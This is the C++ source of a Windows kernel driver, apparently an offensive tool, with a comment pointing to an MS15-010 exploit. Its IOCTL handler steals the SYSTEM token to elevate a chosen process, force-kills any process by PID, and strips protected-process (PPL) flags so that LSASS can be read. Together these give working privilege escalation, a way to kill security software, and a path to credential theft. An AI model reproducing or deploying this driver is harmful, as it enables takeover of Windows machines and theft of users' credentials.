#include "defs.hpp"


// from https://www.exploit-db.com/exploits/37098 MS15-010


BOOLEAN find_and_replace_member(PDWORD_PTR pdwStructure, DWORD_PTR dwCurrentValue, DWORD_PTR dwNewValue, DWORD_PTR dwMaxSize)
{
	DWORD_PTR dwIndex, dwMask;

#ifdef _M_X64
	dwMask = ~0xf;
#else
	dwMask = ~7;
#endif
	//
	dwCurrentValue &= dwMask;

	for (dwIndex = 0; dwIndex < dwMaxSize; dwIndex++)
	{
		if ((pdwStructure[dwIndex] & dwMask) == dwCurrentValue)
		{
			//
			pdwStructure[dwIndex] = dwNewValue;
			return TRUE;
		}
	}

	return FALSE;
}



NTSTATUS DeviceIOCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ULONG ByteIO = 0;
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
	ULONG controlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	PTASK_INFO input = (PTASK_INFO)Irp->AssociatedIrp.SystemBuffer;

	switch (controlCode) {
	case IOCTL_REPLACE_TOKEN: {
		// do the work 
		DWORD32 pid = input->target;
		DWORD32 pid2 = input->stealFrom;
		if (!pid2) {
			pid2 = 4;
		}
		if (pid) {
			PEPROCESS  process = NULL;
			PEPROCESS  system = NULL;
			PsLookupProcessByProcessId((HANDLE)input->target, &process);
			PsLookupProcessByProcessId((HANDLE)pid2, &system);
			if (process && system) {
				PACCESS_TOKEN process_token = PsReferencePrimaryToken(process);
				PACCESS_TOKEN system_token = PsReferencePrimaryToken(system);
				if (system_token && process_token) {
					BOOLEAN r = find_and_replace_member((PDWORD_PTR)process, (DWORD_PTR)process_token, (DWORD_PTR)system_token, 0x200);
					if (r == TRUE) {
						DEBUG_PRINT("[+]  Target Process Elevated\n");
						status = STATUS_SUCCESS;
					}
				}
			}


		}


		break;
	}
	
	case IOCTL_KILL_PROCESS: {
		DWORD32 pid = input->target;
		if (pid){
			HANDLE tokill = NULL;
			CLIENT_ID clientId = { 0 };
			OBJECT_ATTRIBUTES zoa = { sizeof(OBJECT_ATTRIBUTES) };
			clientId.UniqueProcess = (HANDLE)pid;
			if (!NT_SUCCESS(ZwOpenProcess(&tokill, PROCESS_ALL_ACCESS, &zoa, &clientId))) {
				DEBUG_PRINT("[ERROR] Failed to open process to kill\n");
				break;
			}

			if (NT_SUCCESS(ZwTerminateProcess(tokill, STATUS_ACCESS_VIOLATION))) {
				status = STATUS_SUCCESS;
			}
		}

		break;

	}
	
	case IOCTL_UNPROTECT_LSA: {
		DWORD32 pid = input->target;
		DWORD64 offset = input->offset;
		if (pid && offset) {
			PEPROCESS  process = NULL;
			PsLookupProcessByProcessId((HANDLE)input->target, &process);
			if (process) {
				PPS_PROTECTION protection =  (PPS_PROTECTION)((ULONG_PTR)process + offset);
				protection->Audit = 0;
				protection->Level = 0;
				protection->Signer = 0;
				protection->Type = 0;
				status = STATUS_SUCCESS;

			}
		}
		break;
	}
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

extern "C"
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {

	UNREFERENCED_PARAMETER(RegistryPath);


	UNICODE_STRING devName = RTL_CONSTANT_STRING(DEVICE);
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(LINK);

	PDEVICE_OBJECT DeviceObject;

	// code
	DriverObject->DriverUnload = DriverUnload;
	DEBUG_PRINT(("[+]  driver initialized successfully\n"));


	// Set up the dispatch routine
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;


	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIOCTL;

	NTSTATUS status = IoCreateDevice(
		DriverObject,		
		0,					
		&devName,			
		FILE_DEVICE_UNKNOWN,	
		0,					
		FALSE,			
		&DeviceObject
	);
	if (!NT_SUCCESS(status)) {
		DEBUG_PRINT("Failed to create device object (0x%08X)\n", status);
		return status;
	}


	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		DEBUG_PRINT("Failed to create symbolic link (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	return STATUS_SUCCESS;
}